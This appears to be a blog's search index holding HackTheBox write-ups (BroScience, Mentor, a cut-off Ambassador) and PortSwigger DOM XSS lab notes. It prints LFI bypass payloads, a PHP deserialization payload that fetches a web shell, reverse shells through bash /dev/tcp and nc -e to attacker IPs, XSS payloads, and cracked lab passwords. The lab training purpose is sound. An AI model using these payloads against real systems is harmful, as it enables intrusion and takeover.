[ { "title": "(HTB) - BroScience", "url": "/posts/Broscience/", "categories": "HackTheBox, Linux", "tags": "Web, Local File Inclusion, SSH, openssl", "date": "2023-07-23 10:33:00 +0200", "snippet": "BroScience is a Medium Difficulty Linux machine that features a web application vulnerable to LFI. Through the ability to read arbitrary files on the target, the attacker gains an insight into how account activation codes are generated, and is thus able to create a set of potentially valid tokens to activate a newly created account. Once logged in, further enumeration reveals that the site’s theme-picker functionality is vulnerable to PHP deserialisation using a custom gadget chain, allowing an attacker to copy files on the target system, eventually leading to remote code execution. Once a foothold has been established, a handful of hashes are recovered from a database, which once cracked prove to contain a valid SSH password for the machine’s main user bill. Finally, the privilege escalation is based on a cronjob executing a Bash script that is vulnerable to command injection through a certificate generated by openssl, forfeiting root access to the attacker.EnumerationNMAPNmap scan report for 10.129.126.184Host is up (0.067s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey: | 3072 df17c6bab18222d91db5ebff5d3d2cb7 (RSA)|_ 256 3f8a56f8958faeafe3ae7eb880f679d2 (ECDSA)80/tcp open http Apache httpd 2.4.54|_http-server-header: Apache/2.4.54 (Debian)|_http-title: Did not follow redirect to https://broscience.htb/443/tcp open ssl/http Apache httpd 2.4.54 ((Debian))|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.54 (Debian)|_http-title: BroScience : Home| tls-alpn: |_ http/1.1| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT| Not valid before: 2022-07-14T19:48:36|_Not valid after: 2023-07-14T19:48:36| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not setService Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelThere are ports 22, 80 and 443 open. Let’s first check the application and mind the redirect!WebserverFirst we need to add broscience.htb into /etc/hostsI’ll be running all requests through Burp!On the first site, we can notice: login usernamesThis pops right away, if we click a little bit around we’d find following path in Burp’s sitemap img.php which accepts path= parameter.Initial FootholdFinding Local File Inclusion (LFI)Now if you’re thinking LFI, you’re probably right (or not?). If we enter ../ we’d get Attack detected. back so there is some kind of blacklist. If we encode once, we’d get blocked BUT if we encode ../ twice = %252e%252e%252f we’d bypass the filter.There is another filter on /etc/passwd but we can bypass that to!Request: /includes/img.php?path=c%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/test/%252e%252e%252f/passwdWe can read PHP files.If we check /var/www/html/includes/img.php we’ll see that file will get piped into file_get_contents (not like in exec or similar function which parses and executes the PHP)&amp;lt;?phpif (!isset($_GET[&#39;path&#39;])) { die(&#39;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; Missing \\&#39;path\\&#39; parameter.&#39;);}// Check for LFI attacks$path = $_GET[&#39;path&#39;];$badwords = array(&quot;../&quot;, &quot;etc/passwd&quot;, &quot;.ssh&quot;);foreach ($badwords as $badword) { if (strpos($path, $badword) !== false) { die(&#39;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; Attack detected.&#39;); }}// Normalize path$path = urldecode($path);// Return the imageheader(&#39;Content-Type: image/png&#39;);echo file_get_contents(&#39;/var/www/html/images/&#39; . $path);?&amp;gt;We can also find credentials for Postgre database using following request:/includes/img.php?path=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fvar/www/html/includes/db_connect.php############################&amp;lt;?php$db_host = &quot;localhost&quot;;$db_port = &quot;5432&quot;;$db_name = &quot;broscience&quot;;$db_user = &quot;dbuser&quot;;$db_pass = &quot;RangeOfMotion%777&quot;;$db_salt = &quot;NaCl&quot;;$db_conn = pg_connect(&quot;host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}&quot;);if (!$db_conn) { die(&quot;&amp;lt;b&amp;gt;Error&amp;lt;/b&amp;gt;: Unable to connect to database&quot;);}?&amp;gt;Unfortunately password does not work anywhere so we have to search further.We can read activate.php to see if we can somehow be able to guess/calculate activation code, which we need while signupincludes/utils.php get’s included in register.php.Token is not implemented in safely manner.function generate_activation_code() { $chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;; srand(time()); $activation_code = &quot;&quot;; for ($i = 0; $i &amp;lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code;}We can see that it calles seed srand(time()) and time() is something that we can calculate, since response returns the time.# This oneliner takes date from response and sends requests using system time for translated time - 10 seconds = 10 requests.php -f activation.php `php -r &quot;echo strtotime(&#39;11 Jan 2023 07:43:42 GMT&#39;);&quot;` | xargs -n1 -I{} -P1 bash -c &quot;curl --proxy http://127.0.0.1:8080 -k https://broscience.htb/activate.php?code={} --silent | grep activated&quot;This is the script that i’ve used. First i used strtotime using date that was returned in response when account was created register.php. Then i echoed time() with that value for the last 10 seconds and piped it into xargs. I could’ve used Burps intruder instead&amp;lt;?phpfunction generate_activation_code($gen_time) { $chars = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&quot;; srand($gen_time); $activation_code = &quot;&quot;; for ($i = 0; $i &amp;lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code;}if (isset($argv[1])) { $gen_time = $argv[1]; #echo &quot;Using time from Arguments: &quot;.$gen_time.&quot;\\n&quot;;}else { $gen_time = time(); #echo &quot;Using current time: &quot;.$gen_time.&quot;\\n&quot;;}for ($x = 0; $x &amp;lt;= 10; $x++) { echo generate_activation_code($gen_time-$x); echo &quot;\\n&quot;;} ?&amp;gt;Activation was succesful!We can log in, but we only have only more option really, so let’s take a look into the code base (remember, we still use LFI to read the code!).If we check burp, we’d see GET request to swap-theme.php.&amp;lt;?phpsession_start();// Check if user is logged in alreadyif (!isset($_SESSION[&#39;id&#39;])) { header(&#39;Location: /index.php&#39;);}// Swap the themeinclude_once &quot;includes/utils.php&quot;;if (strcmp(get_theme(), &quot;light&quot;) === 0) { set_theme(&quot;dark&quot;);} else { set_theme(&quot;light&quot;);}// Redirectif (!empty($_SERVER[&#39;HTTP_REFERER&#39;])) { header(&quot;Location: {$_SERVER[&#39;HTTP_REFERER&#39;]}&quot;);} else { header(&quot;Location: /index.php&quot;);}Code above calls includes/utils.php and its functions get_theme() and set_theme(). If we follow up on those functions, we’ll notice that cookie user-prefs is getting serialized. We could’ve noticed that if we’d check the value in the cookie user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7fQ%3D%3D ==&amp;gt; user-prefs=O:9:&quot;UserPrefs&quot;:1:{s:5:&quot;theme&quot;;s:4:&quot;dark&quot;;}Below the code:&amp;lt;?php...class UserPrefs { public $theme; public function __construct($theme = &quot;light&quot;) { $this-&amp;gt;theme = $theme; }}function get_theme() { if (isset($_SESSION[&#39;id&#39;])) { if (!isset($_COOKIE[&#39;user-prefs&#39;])) { $up_cookie = base64_encode(serialize(new UserPrefs())); setcookie(&#39;user-prefs&#39;, $up_cookie); } else { $up_cookie = $_COOKIE[&#39;user-prefs&#39;]; } $up = unserialize(base64_decode($up_cookie)); return $up-&amp;gt;theme; } else { return &quot;light&quot;; }}function get_theme_class($theme = null) { if (!isset($theme)) { $theme = get_theme(); } if (strcmp($theme, &quot;light&quot;)) { return &quot;uk-light&quot;; } else { return &quot;uk-dark&quot;; }}function set_theme($val) { if (isset($_SESSION[&#39;id&#39;])) { setcookie(&#39;user-prefs&#39;,base64_encode(serialize(new UserPrefs($val)))); }}class Avatar { public $imgPath; public function __construct($imgPath) { $this-&amp;gt;imgPath = $imgPath; } public function save($tmp) { $f = fopen($this-&amp;gt;imgPath, &quot;w&quot;); fwrite($f, file_get_contents($tmp)); fclose($f); }}class AvatarInterface { public $tmp; public $imgPath; public function __wakeup() { $a = new Avatar($this-&amp;gt;imgPath); $a-&amp;gt;save($this-&amp;gt;tmp); }}?&amp;gt;Codebase above is vulnerable to PHP deserialization / PHP Object exploitation. I suggest following article and IppSec’s videoIf we reach initialize Avatar, we can write files through file_get_contents.This is code that i’ve used to serialize payload:&amp;lt;?phpclass UserPrefs { public $theme; public function __construct($theme = &quot;light&quot;) { $this-&amp;gt;theme = new AvatarInterface(); }}class Avatar { public $imgPath; public function __construct($imgPath) { $this-&amp;gt;imgPath = $imgPath; } public function save($tmp) { $f = fopen($this-&amp;gt;imgPath, &quot;w&quot;); fwrite($f, file_get_contents($tmp)); fclose($f); }}class AvatarInterface { public $tmp = &quot;http://10.10.16.91/cmd.php&quot;; public $imgPath = &quot;cmd.php&quot;; public function __wakeup() { $a = new Avatar($this-&amp;gt;imgPath); $a-&amp;gt;save($this-&amp;gt;tmp); }}$obj = new UserPrefs();echo &quot;Serialized payload: &quot;.serialize($obj);echo &quot;\\n&quot;;echo &quot;Serialized payload and base64 encoded: &quot;.base64_encode(serialize($obj));echo &quot;\\n&quot;;?&amp;gt;After being logged in we can simply change user-prefs with payload that was generated.If everything has been done right, our cmd.php should have been uploaded!Looks good:I used following TCP reverse shell for bash, i’ve just fully URL encoded:bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.16.91/4444 0&amp;gt;&amp;amp;1&quot;Shell should pop:Privilege escalation to bill from www-datapsql -h 127.0.0.1 -U dbuser -d broscience -W -c &quot;select * from users;&quot;We can decode Bill’s password, just remember to add Salt!13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym Session..........: hashcatStatus...........: CrackedHash.Mode........: 20 (md5($salt.$pass))Hash.Target......: 13edad4932da9dbb57d9cd15b66ed104:NaClWe can login via SSH as bill.Privilege Escalation to rootI’ve ran linpeas as usual for quick wins and any out-of-ordinary findings and it showed:╔══════════╣ Unexpected in /opt (usually empty)total 12drwxr-xr-x 2 root root 4096 Jul 14 16:06 .drwxr-xr-x 19 root root 4096 Jan 2 04:50 ..-rwxr-xr-x 1 root root 1806 Jul 14 16:05 renew_cert.sh When running pspy64 we can see that script is being called by root. (pspy64 -r /tmp -r /opt -r /home -pf -i 1000)This is /opt/renew.sh that’s being ran.#!/bin/bashif [ &quot;$#&quot; -ne 1 ] || [ $1 == &quot;-h&quot; ] || [ $1 == &quot;--help&quot; ] || [ $1 == &quot;help&quot; ]; then echo &quot;Usage: $0 certificate.crt&quot;; exit 0;fiif [ -f $1 ]; then openssl x509 -in $1 -noout -checkend 86400 &amp;gt; /dev/null if [ $? -eq 0 ]; then echo &quot;No need to renew yet.&quot;; exit 1; fi subject=$(openssl x509 -in $1 -noout -subject | cut -d &quot;=&quot; -f2-) country=$(echo $subject | grep -Eo &#39;C = .{2}&#39;) state=$(echo $subject | grep -Eo &#39;ST = .*,&#39;) locality=$(echo $subject | grep -Eo &#39;L = .*,&#39;) organization=$(echo $subject | grep -Eo &#39;O = .*,&#39;) organizationUnit=$(echo $subject | grep -Eo &#39;OU = .*,&#39;) commonName=$(echo $subject | grep -Eo &#39;CN = .*,?&#39;) emailAddress=$(openssl x509 -in $1 -noout -email) country=${country:4} state=$(echo ${state:5} | awk -F, &#39;{print $1}&#39;) locality=$(echo ${locality:3} | awk -F, &#39;{print $1}&#39;) organization=$(echo ${organization:4} | awk -F, &#39;{print $1}&#39;) organizationUnit=$(echo ${organizationUnit:5} | awk -F, &#39;{print $1}&#39;) commonName=$(echo ${commonName:5} | awk -F, &#39;{print $1}&#39;) echo $subject; echo &quot;&quot;; echo &quot;Country =&amp;gt; $country&quot;; echo &quot;State =&amp;gt; $state&quot;; echo &quot;Locality =&amp;gt; $locality&quot;; echo &quot;Org Name =&amp;gt; $organization&quot;; echo &quot;Org Unit =&amp;gt; $organizationUnit&quot;; echo &quot;Common Name =&amp;gt; $commonName&quot;; echo &quot;Email =&amp;gt; $emailAddress&quot;; echo -e &quot;\\nGenerating certificate...&quot;; openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 &amp;lt;&amp;lt;&amp;lt;&quot;$country $state $locality $organization $organizationUnit $commonName $emailAddress &quot; 2&amp;gt;/dev/null /bin/bash -c &quot;mv /tmp/temp.crt /home/bill/Certs/$commonName.crt&quot;else echo &quot;File doesn&#39;t exist&quot; exit 1;The problem above is that we can run subcommands if we insert them into certificate subject values:openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout broscience.key -out broscience.crt -days 1We can check if our calues have been inserted into the certificateopenssl x509 -in broscience.crt -noout -textShell should pop in the next 2 minutes as root!" }, { "title": "(Portswigger/WebAcademy) - DOM-Based Cross-Site Scripting (XSS)", "url": "/posts/DOM-XSS/", "categories": "Web Application, Cross Site Scripting", "tags": "Notes, Cross Site Scripting, DOM-based XSS, Portswigger", "date": "2023-03-25 08:00:00 +0100", "snippet": "IntroThis post/writeup is all about the DOM-Based XSS Vulnerabilities.I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well.To learn more on the topic, please visit the article linked above at Portswigger’s.TOC Intro TOC DOM XSS in document.write sink using source location.search DOM XSS in document.write sink using source location.search inside a select element DOM XSS in innerHTML sink using source location.search DOM XSS in jQuery anchor href attribute sink using location.search source DOM XSS in jQuery selector sink using a hashchange event DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded Reflected DOM XSS Stored DOM XSSDOM XSS in document.write sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL. To solve this lab, perform a cross-site scripting attack that calls the alert function.I’ll be using DOM Invader to find the sink. We basically put a string and if found in the DOM it should be shown in the DOM invader. In order to use the DOM Invader, Burp’s integrated browser has to be used.XSS Exploitation here is straightforward: &quot;&amp;gt;&amp;lt;img src/onerror=alert(1)&amp;gt;DOM XSS in document.write sink using source location.search inside a select element This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element. To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.This lab has the same optics than the previous lab, hence no screenshot :).So we already know what source and sinks are supposed to be BUT let’s check DOM invader. If we select a post, sink (and source if selected in DOM Invder options) will show up.Injecting into productId did not work, into storeId URL parameter did however work, so the website gets loaded dynamically and outputs our input onto the page.For example, if we issue following GET request: https://0a1600de0322ee00c09ea9f800bc00da.web-security-academy.net/product?productId=4&amp;amp;storeId=canary it’ll render option element&amp;lt;option selected=&quot;&quot;&amp;gt;canaryh4eazxxxlocation.searchh4eazxxxURLSearchParamsstoreIdh4eazxxx&amp;lt;/option&amp;gt;Now can we make an alert fire?… Yes we can!https://0a1600de0322ee00c09ea9f800bc00da.web-security-academy.net/product?productId=4&amp;amp;storeId=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;Alternatively we could do it like this, so HTML will not break.storeId=&quot;&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;img%20src=1%20onerror=alert(1)&amp;gt;DOM XSS in innerHTML sink using source location.search This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an innerHTML assignment, which changes the HTML contents of a div element, using data from location.search. To solve this lab, perform a cross-site scripting attack that calls the alert function.Here i will also use DOM Invader,We see the source location.search and the sink innerHTML.We can use simple XSS payload to trigger the alert!DOM XSS in jQuery anchor href attribute sink using location.search source This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library’s $ selector function to find an anchor element, and changes its href attribute using data from location.search. To solve this lab, make the “back” link alert document.cookie.In this lab i will also be using DOM invader. If we go to Submit Feedback and send submit the form, we’ll notice a returnPath parameter, and this is getting passed (or getting read) in DOM.We can inject javascript into returnPath parameter and alert should fire when back is clicked.DOM XSS in jQuery selector sink using a hashchange event This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery’s $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property. To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.In this lab, if we pay attention to DOM Invader, we will notice that source has been found.If we search for location.href, we’ll find this entry&amp;lt;script&amp;gt; $(window).on(&#39;hashchange&#39;, function(){ var post = $(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;); if (post) post.get(0).scrollIntoView(); }); &amp;lt;/script&amp;gt;This will load title of the post into $().If we attach simple XSS payload the print() should open.Payload for victim used:&amp;lt;iframe src=&quot;https://0a3d008603576fcdc0b49fdd006900b5.web-security-academy.net/#&quot; onload=&quot;this.src+=&#39;&amp;lt;img src=x onerror=print()&amp;gt;&#39;&quot;&amp;gt;&amp;lt;/iframe&amp;gt;This fired a print().I highly recommend checking this video: https://www.youtube.com/watch?v=JgiX3kyK8MEDOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality. AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded. To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.I’ll again make use of DOM invader to identify sinks and sources.Payload:Cheatsheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet (search for “Angular”)Reflected DOM XSS This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink. To solve this lab, create an injection that calls the alert() function.For this lab i will once again, use DOM invader.We have got the sink and the source. Dom invader clearly states that sink is in eval function, source however is taken from location.search, hence it is returned from the server (= Reflected).Notice the eval function and this.responseTextfunction search(path) { var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() { if (this.readyState == 4 &amp;amp;&amp;amp; this.status == 200) { eval(&#39;var searchResultsObj = &#39; + this.responseText); displaySearchResults(searchResultsObj); } }; xhr.open(&quot;GET&quot;, path + window.location.search); xhr.send(); function displaySearchResults(searchResultsObj) { var blogHeader = document.getElementsByClassName(&quot;blog-header&quot;)[0]; var blogList = document.getElementsByClassName(&quot;blog-list&quot;)[0]; var searchTerm = searchResultsObj.searchTerm var searchResults = searchResultsObj.results var h1 = document.createElement(&quot;h1&quot;); h1.innerText = searchResults.length + &quot; search results for &#39;&quot; + searchTerm + &quot;&#39;&quot;; blogHeader.appendChild(h1);There is no fast way to exploit this, exept try and error to escape the escaped characters. Fortunately backslash is not escaped and we can break out of what is supposed to be a string. Do note that there should be no spaces in the payload.So let us try to trigger an alert using following payload:Payload\\&quot;-alert(1)}//Alert has fired! Lab has been solved.Stored DOM XSS This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function.Payload:&amp;lt;&amp;gt;&amp;lt;img src/onerror=alert(1)&amp;gt;If we check the DOM what’s going on we will see following&amp;lt;p&amp;gt;&amp;amp;lt;&amp;amp;gt;&amp;lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&amp;gt;&amp;lt;/p&amp;gt;This is the explanation from Portswigger: In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML. Reference: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-storedThis is the vulnerable function: function escapeHTML(html) { return html.replace(&#39;&amp;lt;&#39;, &#39;&amp;amp;lt;&#39;).replace(&#39;&amp;gt;&#39;, &#39;&amp;amp;gt;&#39;); }" }, { "title": "(HTB) - Mentor", "url": "/posts/mentor/", "categories": "HackTheBox, Linux", "tags": "Common Applications, Outdated Software, Apache, MySQL, Grafana, Python, SQL, Configuration Analysis, Arbitrary File Read, Clear Text Credentials, Directory Traversal", "date": "2023-03-11 17:33:00 +0100", "snippet": "EnumerationNMAPNmap scan report for mentorquotes.htb (10.129.213.168)Host is up (0.083s latency).Not shown: 4992 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 c73bfc3cf9ceee8b4818d5d1af8ec2bb (ECDSA)|_ 256 4440084c0ecbd4f18e7eeda85c68a4f7 (ED25519)80/tcp open http Apache httpd 2.4.52|_http-title: MentorQuotes| http-server-header: | Apache/2.4.52 (Ubuntu)|_ Werkzeug/2.0.3 Python/3.6.91702/tcp filtered deskshare3414/tcp filtered wip-port4800/tcp filtered iims9979/tcp filtered visweather15151/tcp filtered bo2k36368/tcp filtered unknownWebsiteWe have to add mentorquotes.htb into /etc/hosts as we’ll get redirected there right away if we open IP in browser.Directory and Subdomain search using FFUFI’ve found api subdomain using FFUF and using --ms all which include all statuses. Without it, the subdomain is easy to miss.┌──(luka㉿yokai)-[~/htb/boxes/mentor]└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mentorquotes.htb -H &quot;Host: FUZZ.mentorquotes.htb&quot; --mc all --fw 18 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://mentorquotes.htb :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.mentorquotes.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response words: 18________________________________________________api [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 160ms][WARN] Caught keyboard interrupt (Ctrl-C)Let’s add api.mentorquotes.htb to the /etc/hosts file!There we go…┌──(luka㉿yokai)-[~/htb/boxes/mentor]└─$ curl http://api.mentorquotes.htb -s | jq .{ &quot;detail&quot;: &quot;Not Found&quot;}Directory search on api.mentorquotes.htbLet’s start FFUF on api.mentorquotes.htb.┌──(luka㉿yokai)-[~/htb/boxes/mentor]└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://api.mentorquotes.htb/FUZZ --mc all --fw 2 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://api.mentorquotes.htb/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: all :: Filter : Response words: 2________________________________________________admin [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 80ms]docs [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 104ms]users [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 136ms]quotes [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 39ms]server-status [Status: 403, Size: 285, Words: 20, Lines: 10, Duration: 59ms]@We’ve got few new directories where we can continue our enumeration. docs definately looks promising ;):We even find an Email Address which we should note james@mentorquotes.htbDigging deeper on api.mentorquotes.htbWe can signup a user and login. Authorization key will return.We cannot display any user´´´┌──(luka㉿yokai)-[~/htb/boxes/mentor]└─$ curl -X ‘GET’ ‘http://api.mentorquotes.htb/users/’ -H ‘accept: application/json’ -H ‘Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InRlc3R0ZXN0IiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.qUR8VFEsFPQaYLsCmcdb0dMwuxbULuCOsdOG1ncoWJ4’ -s | jq .{ “detail”: “Only admin users can access this resource”}´´´We can display quotes using same Authorization header and quotes endpoint. They are the same as on the mentorquotes.htb BUT we cannot add new quotes as we get same error as above.If we use james as a user and different email, there is some broken login, which gives us admin privileges┌──(luka㉿yokai)-[~/htb]└─$ curl http://api.mentorquotes.htb/users/ -H &#39;accept: application/json&#39; -H &#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0QG1lbnRvcnF1b3Rlcy5odGIifQ.yhdN6mhlvDCzb7QDbE_s31QqqnGPoWug_txMrXUi5sM&#39; -s | jq .[ { &quot;id&quot;: 1, &quot;email&quot;: &quot;james@mentorquotes.htb&quot;, &quot;username&quot;: &quot;james&quot; }, { &quot;id&quot;: 2, &quot;email&quot;: &quot;svc@mentorquotes.htb&quot;, &quot;username&quot;: &quot;service_acc&quot; }, { &quot;id&quot;: 4, &quot;email&quot;: &quot;james@mentorquotes.htb&quot;, &quot;username&quot;: &quot;testtest&quot; },We can access /admin now┌──(luka㉿yokai)-[~/htb]└─$ curl &#39;http://api.mentorquotes.htb/admin/&#39; -H &#39;Content-Type: application/json&#39; -H &#39;accept: application/json&#39; -H &#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0QG1lbnRvcnF1b3Rlcy5odGIifQ.yhdN6mhlvDCzb7QDbE_s31QqqnGPoWug_txMrXUi5sM&#39; -s | jq .{ &quot;admin_funcs&quot;: { &quot;check db connection&quot;: &quot;/check&quot;, &quot;backup the application&quot;: &quot;/backup&quot; }}Apparently there’s a Command Injection Vulnerability in the /backup endpoint.┌──(luka㉿yokai)-[~/htb]└─$ curl &#39;http://api.mentorquotes.htb/admin/backup&#39; -H &#39;Content-Type: application/json&#39; -H &#39;accept: application/json&#39; -H &#39;Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0QG1lbnRvcnF1b3Rlcy5odGIifQ.yhdN6mhlvDCzb7QDbE_s31QqqnGPoWug_txMrXUi5sM&#39; -s -X POST -d &#39;{&quot;path&quot;:&quot;; ping -c 2 10.10.16.35 #&quot;}&#39; | jq .Netcat is installed so getting shell is very easyPOST /admin/backup HTTP/1.1Host: api.mentorquotes.htbUser-Agent: curl/7.85.0Content-Type: application/jsonaccept: application/jsonAuthorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJ0ZXN0QG1lbnRvcnF1b3Rlcy5odGIifQ.yhdN6mhlvDCzb7QDbE_s31QqqnGPoWug_txMrXUi5sMContent-Length: 41Connection: close{&quot;path&quot;:&quot;;nc 10.10.16.35 8000 -e /bin/sh;#&quot;}paste5Get better shellpaste6Shell as svcPostgre EnumerationConnect using psql using proxychains. use found credentials postgres:postgresCracking the hash using hashcatWe get password. mode 0... 53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani Session..........: hashcatStatus...........: CrackedHash.Mode........: 0 (MD5)Hash.Target......: 53f22d0dfa10dce7e29cd31f4f953fd8Time.Started.....: Mon Dec 12 14:39:04 2022 (0 secs)Time.Estimated...: Mon Dec 12 14:39:04 2022 (0 secs)we can use svc:123meunomeeivani to SSH AND escape the docker container!Shell as jamesFinding james’s password in SNMP.confIf we look close enough, we’ll findsvc@mentor:/$ cat /etc/snmp/snmpd.conf ...# arguments: username [noauth|auth|priv [OID | -V VIEW [CONTEXT]]]rouser authPrivUser authpriv -V systemonly# include a all *.conf files in a directoryincludeDir /etc/snmp/snmpd.conf.dcreateUser bootstrap MD5 SuperSecurePassword123__ DESrouser bootstrap privcom2sec AllUser default internalgroup AllGroup v2c AllUser...If we use same password for jamesPrivilege Escalation from james to root/bin/sh can be run as sudojames@mentor:/$ sudo -l[sudo] password for james: Sorry, try again.[sudo] password for james: Matching Defaults entries for james on mentor: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser james may run the following commands on mentor: (ALL) /bin/sh" }, { "title": "(HTB) - Ambassador", "url": "/posts/ambassador/", "categories": "HackTheBox, Linux", "tags": "Common Applications, Outdated Software, Apache, MySQL, Grafana, Python, SQL, Configuration Analysis, Arbitrary File Read, Clear Text Credentials, Directory Traversal", "date": "2023-03-05 17:33:00 +0100", "snippet": "EnumerationNMAPNmap scan report for 10.10.11.183Host is up (0.033s latency).Not shown: 996 closed tcp ports (conn-refused)PORT STATE SERVICE22/tcp open ssh| ssh-hostkey: | 3072 29dd8ed7171e8e3090873cc651007c75 (RSA)| 256 80a4c52e9ab1ecda276439a408973bef (ECDSA)|_ 256 f590ba7ded55cb7007f2bbc891931bf6 (ED25519)80/tcp open http|_http-generator: Hugo 0.94.2|_http-title: Ambassador Development Server3000/tcp open ppp3306/tcp open mysql| mysql-info: | Protocol: 10| Version: 8.0.30-0ubuntu0.20.04.2| Thread 